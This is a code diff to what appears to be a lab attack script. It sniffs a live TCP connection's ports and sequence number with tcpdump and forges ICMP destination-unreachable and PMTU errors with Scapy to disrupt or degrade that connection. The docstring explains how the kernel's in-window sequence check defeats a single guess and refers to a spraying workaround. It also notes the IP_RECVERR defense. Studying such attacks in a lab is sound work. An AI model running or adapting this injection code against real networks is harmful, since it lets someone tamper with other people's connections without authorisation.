@@ -35,8 +35,15 @@ non-fatal sk_err_soft for established sockets unless IP_RECVERR is set.
 Plain `ncat` does not set it, so a perfectly-crafted packet against an
 ordinary `ncat`-held connection will NOT kill it — this is a real,
 separate defense worth reporting alongside the doc's own Section 6 ideas.
-Type 3/Code 4 (PMTU) has no such gate: ipv4_sk_update_pmtu() runs
-unconditionally once the embedded header matches a socket.
+Type 3/Code 4 (PMTU) has no IP_RECVERR-style gate: ipv4_sk_update_pmtu()
+runs unconditionally once the embedded header matches a socket. But the
+`between(seq, tp->snd_una, tp->snd_nxt)` in-window check in tcp_v4_err()
+runs for *every* type/code, including this one — and for an ACTIVE bulk
+transfer that window is only cwnd*mss wide (tens to a couple hundred KB)
+and slides forward at the full transfer rate, so a single sniffed seq is
+almost always already stale (ACKed and out of window) by the time it
+goes through tcpdump + Python + Scapy send(). See inject_pmtu.py's
+docstring for the spray-based fix this lab uses instead of one guess.
 """
 import argparse
 import re
@@ -51,10 +58,12 @@ SERVER_IP = "10.0.0.2"
 def capture_live_state(iface, from_ip, from_port, to_ip, count, timeout):
     """
     Sniff `from_ip`'s own outgoing TCP segments to `to_ip` and recover
-    (peer_port, next_seq): the peer's port on the other end, and the next
-    sequence number `from_ip` itself is expected to send — i.e. a value
-    inside `from_ip`'s *own* current send window. Pass from_port=None to
-    match any source port.
+    (from_port_seen, to_port_seen, next_seq): the two ports of the
+    connection as seen on the wire, and the next sequence number
+    `from_ip` itself is expected to send — i.e. a value inside
+    `from_ip`'s *own* current send window. Pass from_port=None to match
+    any source port (from_port_seen is then discovered from traffic
+    rather than an input).
     """
     port_filter = f"src port {from_port} and " if from_port else ""
     cmd = [
@@ -77,12 +86,13 @@ def capture_live_state(iface, from_ip, from_port, to_ip, count, timeout):
         rf"Flags \[[^\]]*\], seq (\d+)(?::(\d+))?"
     )
 
-    peer_port = next_seq = None
+    from_port_seen = to_port_seen = next_seq = None
     for line in stdout.splitlines():
         m = line_re.search(line)
         if not m:
             continue
-        peer_port = int(m.group(2))
+        from_port_seen = int(m.group(1))
+        to_port_seen = int(m.group(2))
         seq_start, seq_end = int(m.group(3)), m.group(4)
         if seq_end is not None:
             # "seq X:Y" is a data range; Y is the next byte from_ip expects to send/have acked.
@@ -93,12 +103,12 @@ def capture_live_state(iface, from_ip, from_port, to_ip, count, timeout):
             # seq at all. The next byte is therefore N + 1, not N.
             next_seq = seq_start + 1
 
-    if peer_port is None:
+    if from_port_seen is None:
         raise RuntimeError(
             f"No outgoing segment captured from {from_ip} to {to_ip}. "
             "Is there a live connection between them right now?"
         )
-    return peer_port, next_seq
+    return from_port_seen, to_port_seen, next_seq
 
 
 def _build_icmp_error(target_ip, peer_ip, target_port, peer_port, seq, code, mtu=None):
@@ -108,7 +118,10 @@ def _build_icmp_error(target_ip, peer_ip, target_port, peer_port, seq, code, mtu
     `peer_ip` — see module docstring for why the direction matters.
     """
     inner_tcp = TCP(sport=target_port, dport=peer_port, seq=seq)
-    inner_ip = IP(src=target_ip, dst=peer_ip, proto=6)
+    # RFC 1191: a real "fragmentation needed" reply is only plausible for a
+    # packet that had DF set, since that's the only case a router couldn't
+    # just fragment it instead. Match that on the embedded copy for fidelity.
+    inner_ip = IP(src=target_ip, dst=peer_ip, proto=6, flags="DF" if code == 4 else 0)
     icmp = ICMP(type=3, code=code)
     if mtu is not None:
         icmp.nexthopmtu = mtu
@@ -148,7 +161,7 @@ def main():
     args = parser.parse_args()
 
     print(f"Sniffing {args.iface} for {SERVER_IP}:{args.server_port} -> {CLIENT_IP} traffic...")
-    client_port, seq = capture_live_state(
+    _, client_port, seq = capture_live_state(
         args.iface, SERVER_IP, args.server_port, CLIENT_IP, args.count, args.timeout
     )
     print(f"Captured: client_port={client_port} server_seq={seq}")
